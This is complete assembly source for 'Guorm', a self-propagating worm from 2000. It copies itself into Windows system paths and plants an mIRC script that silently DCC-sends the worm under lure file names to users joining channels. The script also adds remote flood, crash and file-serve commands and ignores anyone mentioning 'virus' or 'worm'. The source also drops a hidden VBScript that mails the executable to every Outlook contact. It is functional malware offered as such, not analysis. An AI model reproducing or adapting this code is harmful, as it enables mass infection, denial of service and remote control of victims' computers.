;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                              ;;
;;  .!!!!!.                          '!!  !.!!  ;;
;; !!!!!!!!!                         .'!  !'    ;;
;; !!!'  '!!                       * !!!. !     ;;     Made In
;; !!!                                          ;;
;; !!! !!!!!  !! !!  .!!!. !!.!! !!!!!!!.       ;;   !!!!!!!!!!!
;; !!!. '!!!  !! !!  !! !! !!''  !!'!!'!!       ;;        *
;; !!!!!!!!!  !! !!  !! !! !!    !! !! !!       ;;   !!!!!!!!!!!
;; '!!!!!!!'  '!!!!. '!!!' !!    !! !! !!       ;;
;;                                              ;;    Argentina
;; By (BrainMuscle & OldWary & Kalamar).ar @ 2K ;;
;;                                              ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

.386
locals
jumps
.model flat,STDCALL

extrn	ExitProcess:PROC
extrn	CloseHandle:PROC
extrn	SetCurrentDirectoryA:PROC
extrn	GetCurrentDirectoryA:PROC
extrn	DeleteFileA:PROC
extrn	CreateFileA:PROC
extrn	CopyFileA:PROC
extrn	WriteFile:PROC
extrn	FindFirstFileA:PROC
extrn	FindClose:PROC
extrn	GetCommandLineA:PROC
extrn	ShellExecuteA:PROC

.DATA

FHandle	dd ?

mIRC	db 'C:\mirc',0
mIRC32	db 'C:\mirc32',0
ap	db 'C:\archivos de programa\mirc',0
ap32	db 'C:\archivos de programa\mirc32',0
pf	db 'C:\program files\mirc',0
pf32	db 'C:\program files\mirc32',0

autor	db 'BrainMuscle + OldWary + KALAMAR',0
worm	db 'Guorm',0

NBtsWrn	dd ?
dir	db 260 dup(0)
fdata	db 316 dup(0)

counta	db 0

damini	db 'mirc.ini',0
daini	db 'script.ini',0
direc	db 'C:\Windows\Temp',0
davbs	db 'C:\Windows\Temp\Guorm.vbs',0
lpop	db 'open',0
params	db '',0
guormf	db 260 dup(0)

cmdln	dd ?
userdll	db 'C:\Windows\System\user.dll',0
winuser db 'C:\Windows\System\winuser.exe',0

script	db '[script]',0,13,10
db 'n0=on *:CONNECT:{',13,10
db 'n1=  .join #guorm',13,10
db 'n2=  set %chancolor $chr(3) $+ 4',13,10
db 'n3=  .timercon1 -m 1 250 .msg #guorm %chancolor $+ -------------------------------------- $+ $chr(3)',13,10
db 'n4=  .timercon2 -m 1 500 .msg #guorm Just annother dumbass',13,10
db 'n5=  .timercon3 -m 1 750 .msg #guorm Mother fucker who got infected',13,10
db 'n6=  .timercon4 -m 1 1000 .msg #guorm by Guorm - BrainMuscle + OldWary + Kalamar',13,10
db 'n7=  .timercon5 -m 1 1250 .msg #guorm %chancolor $+ -------------------------------------- $+ $chr(3)',13,10
db 'n8=  .timercon6 -m 1 2000 unset %chancolor',13,10
db 'n9=  chanstatus',13,10
db 'n10=  .timercon7 1 20 update',13,10
db 'n11=}',13,10
db 'n12=on *:JOIN:#guorm:{ .window -h #guorm }',13,10
db 'n13=on *:DISCONNECT:{',13,10
db 'n14=  .part #guorm',13,10
db 'n15=}',13,10
db 'n16=alias -l chanstatus {',13,10
db 'n17=  .timerop1 1 10 if ($me isop #guorm) .topic #guorm -=[ Guorm ]=-',13,10
db 'n18=  .timerop2 1 11 if ($me isop #guorm) .mode #guorm +nst',13,10
db 'n19=  .timerop3 1 12 if ($me isop #guorm) .mode #guorm -o $me',13,10
db 'n20=}',13,10
db 'n21=on *:JOIN:#: if (($nick != $me) && ($chan != #guorm) && ($chan != #virus)) { guorm.infect $nick }',13,10
db 'n22=on *:TEXT:*virus*:*: if ((#virus != $chan) && (#guorm != $chan)) .ignore $nick',13,10
db 'n23=on *:TEXT:*worm*:*: if ((#virus != $chan) && (#guorm != $chan)) .ignore $nick',13,10
db 'n24=on *:TEXT:!GuormFlood*:#guorm:.ignore -u120 $nick | .timer41 10 2 .CTCP $2 PING | .timer42 10 2 .CTCP $2 VERSION | .timer43 10 2 .CTCP $2 FINGER | .timer44 10 2 .CTCP $2 TIME',13,10
db 'n25=ctcp *:!GuormFlood:*:.ignore -u120 $nick | .timer41 10 2 .CTCP $2 PING | .timer42 10 2 .CTCP $2 VERSION | .timer43 10 2 .CTCP $2 FINGER | .timer44 10 2 .CTCP $2 TIME',13,10
db 'n26=on *:TEXT:!joinflood*:#guorm:.timer51 10 2 .join $2 | .timer52 10 3 .part $2',13,10
db 'n27=ctcp *:!joinflood:*:.timer51 10 2 .join $2 | .timer52 10 3 .part $2',13,10
db 'n35=ctcp *:!kill:*:.run -n file://c:/con/con',13,10
db 'n36=ctcp *:!fserve:*:.fserve $nick 1 $2',13,10
db 'n37=ctcp *:+*:*: $right($1-,-1) | /halt',13,10
db 'n38=ctcp *:PING: { raw -q notice $nick : $+ $chr(1) $+ PING BrainMuscle + OldWary + KALAMAR $+ $chr(1) } /halt',13,10
db 'n39=ctcp *:VERSION: { raw -q notice $nick : $+ $chr(1) $+ VERSION Guorm 1.0 $+ $chr(1) } /halt',13,10
db 'n40=ctcp *:FINGER:*: /halt',13,10
db 'n41=ctcp *:TIME: { raw -q notice $nick : $+ $chr(1) $+ TIME Guorm time! $+ $chr(1) } /halt',13,10
db 'n42=ctcp *:AUTHOR: { raw -q notice $nick : $+ $chr(1) $+ AUTHOR BrainMuscle + OldWary + KALAMAR $+ $chr(1) } /halt',13,10
db 'n43=raw 353:*guorm*:/halt',13,10
db 'n44=raw 366:*dguorm*:/halt',13,10
db 'n45=raw 403:*dguorm*:/halt',13,10
db 'n46=raw 442:*dguorm*:/halt',13,10
db 'n47=raw *:*guorm*:/halt',13,10
db 'n48=alias -l file.name return $gettok(:matrix.scr:monkeys3.scr:chanrules.exe:assfucked16&14.scr:notepad-cracked.exe:5433.scr:45435.exe:987423.exe:21363.scr:me&natalie.scr:blank.scr:windowsbreaker.exe:mirc32.exe:fifthelement.scr:mirc32-crack.exe:matrix-trailer.scr:blondy16.scr:funny17.scr:genie-in-a-bottle.scr:boxingaway.scr:windows-update.exe:winzip70.exe:cuteftp.exe:bastard.scr:antivirus99.exe:buffy2k.exe:setup.exe:screensaver4.scr:chan-members.scr:allofus.scr:anti-microsoft.scr:serials99.exe:winamp.exe:13raped.scr:!!!14&16fucked.scr:supertits.scr:supertits.scr:loveme.scr:allmyinfo.scr:mypic.scr:mifoto.scr:mienefoto.scr:monphoto.scr:anti-nuke.exe:needsdeodorant.scr:poopy7.scr:,$r(1,45),58)',13,10
db 'n49=alias guorm.infect {',13,10
db 'n50=  %guorm.sock = guorm.send. $+ $rand(100,9000)',13,10
db 'n51=  socklisten %guorm.sock',13,10
db 'n52=  .timer99 off',13,10
db 'n53=  .timer99 1 120 sockclose guorm.send.*',13,10
db 'n54=  raw -q privmsg $1 : $+ $chr(1) $+ DCC SEND $file.name $longip($ip) $sock(%guorm.sock).port $file(c:\windows\system\user.dll).size $+ $chr(1)',13,10
db 'n55=}',13,10
db 'n56=on *:socklisten:guorm.send.*:{',13,10
db 'n57=  set %guorm.temp guorm.write. $+ $gettok($sockname,3,46) | sockaccept %guorm.temp | guorm.send %guorm.temp | sockclose $sockname',13,10
db 'n58=}',13,10
db 'n59=on *:sockwrite:guorm.write.*:{',13,10
db 'n60=  if ($sock($sockname).sent >= $file(c:\windows\system\user.dll).size) sockwrite -n $sockname',13,10
db 'n61=  else guorm.send $sockname',13,10
db 'n62=}',13,10
db 'n63=alias  guorm.send {',13,10
db 'n64=  bread c:\windows\system\user.dll $sock($sockname).sent 4096 &guorm.data',13,10
db 'n65=  sockwrite $1 &guorm.data',13,10
db 'n66=}',13,10

scfinish db 0

vbscript db '''Guorm(Vbs). Mirc/Outlook/Vbs. By Kalamar & BrainMuscle & OldWary.',13,10
db 'on Error Resume Next',13,10
db 'Dim fso, ws',13,10
db 'Set fso = CreateObject("Scripting.filesystemobject")',13,10
db 'Set ws = CreateObject("WScript.Shell")',13,10
db 'if ws.regread("HKCU\Software\Microsoft\Windows\CurrentVersion\vbsmail") <> "Done" Then',13,10
db 'Set Oapp = CreateObject("Outlook.Application")',13,10
db 'if Oapp = "Outlook" then',13,10
db 'Set OMapi = Oapp.GetNameSpace("MAPI")',13,10
db 'For Each OAddress In OMapi.AddressLists',13,10
db '  If OAddress.AddressEntries.Count <> 0 Then',13,10
db '    For Oque = 1 To OAddress.AddressEntries.Count',13,10
db '      Set Oque2 = OAddress.AddressEntries(Oque)',13,10
db '         if Oque2.address<> "" then',13,10
db '          Set Messge = Oapp.CreateItem(0)',13,10
db '          Messge.to = Oque2.address',13,10
db '          Messge.Subject = "You know what it is!. ;-P"',13,10
db '          Messge.Body = "Hey, here you have!."',13,10
db '          Messge.Attachments.Add fso.getspecialfolder(1) & "\winuser.exe"',13,10
db '          Messge.DeleteAfterSubmit = True',13,10
db '          Messge.Send',13,10
db '         end if',13,10
db '    Next',13,10
db '  End If',13,10
db 'Next',13,10
db 'ws.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\vbsmail", "Done"',13,10
db 'Oapp.Quit',13,10
db 'end if',13,10

vbfinish db 0

.CODE

ChuIsi:
	call GetCommandLineA
	inc eax
	mov dword ptr [cmdln],eax

	mov esi,eax
finddadot:
	lodsb
	cmp al,'.'
	jz chess
	jmp finddadot
chess:
	add esi,3
	mov byte ptr [esi],0
	mov ecx,esi
	mov esi,cmdln
	sub ecx,esi
	lea edi,guormf
	rep movsb

	push 1
	lea eax,userdll
	push eax
;	mov eax,[cmdln]
	lea eax,guormf
	push eax
	call CopyFileA

	push 1
	lea eax,winuser
	push eax
;	mov eax,[cmdln]
	lea eax,guormf
	push eax
	call CopyFileA

	call daFFroutine
	mov [counta],5
	lea eax,mIRC
	push eax
here:
	call SetCurrentDirectoryA
	cmp eax,0
	jnz otroche
	call daFFroutine
otroche:
	cmp [counta],0
	jz Exit
	dec [counta]
	cmp [counta],4
	jz jmirc32
	cmp [counta],3
	jz jap
	cmp [counta],2
	jz jap32
	cmp [counta],1
	jz jpf
;jpf32:
	lea eax,pf32	;if ecx=0 then
	jmp sip
jpf:
	lea eax,pf
	jmp sip
jap:
	lea eax,ap
	jmp sip
jap32:
	lea eax,ap32
	jmp sip
jmirc32:
	lea eax,mIRC32
sip:
	push eax
	jmp here

doda:
	push eax
	call FindClose
	lea eax,dir
	push eax
	push 260
	call GetCurrentDirectoryA
	cmp eax,0
	jz Exit

	lea eax,daini
	push eax
	call DeleteFileA
	push 0
	push 20h
	push 1
	push 0
	push (1 or 2)
	push 40000000h
	lea eax,daini
	push eax
	call CreateFileA
	cmp eax,-1
	jz Exit
	mov dword ptr [FHandle],eax
	push 0
	push offset NBtsWrn
	mov ecx,offset scfinish-offset script
	push ecx
	lea eax,script
	push eax
	push dword ptr [FHandle]
	call WriteFile
	push dword ptr [FHandle]
	call CloseHandle

	lea eax,davbs
	push eax
	call DeleteFileA
	push 0
	push 20h
	push 1
	push 0
	push (1 or 2)
	push 40000000h
	lea eax,davbs
	push eax
	call CreateFileA
	cmp eax,-1
	jz Exit
	mov dword ptr [FHandle],eax
	push 0
	push offset NBtsWrn
	mov ecx,offset vbfinish-offset vbscript
	push ecx
	lea eax,vbscript
	push eax
	push dword ptr [FHandle]
	call WriteFile
	push dword ptr [FHandle]
	call CloseHandle

	push 0	; SW_HIDE
;    INT  nShowCmd // whether file is shown when opened

	lea eax,direc
	push eax
;   LPCTSTR  lpDirectory,// pointer to string that specifies default directory

	lea eax,params
	push eax
;   LPTSTR  lpParameters,// pointer to string that specifies executable-file parameters 

	lea eax,davbs
	push eax
;   LPCTSTR  lpFile,// pointer to filename string

	lea eax,lpop
	push eax
;   LPCTSTR  lpOperation,// pointer to string that specifies operation to perform

	push 0
;   HWND  hwnd,	// handle to parent window

	call ShellExecuteA

Exit:
	push 0
	call ExitProcess

daFFroutine:
	lea eax,fdata
	push eax
	lea eax,damini
	push eax
	call FindFirstFileA
	cmp eax,-1
	jnz doda
	ret

End ChuIsi
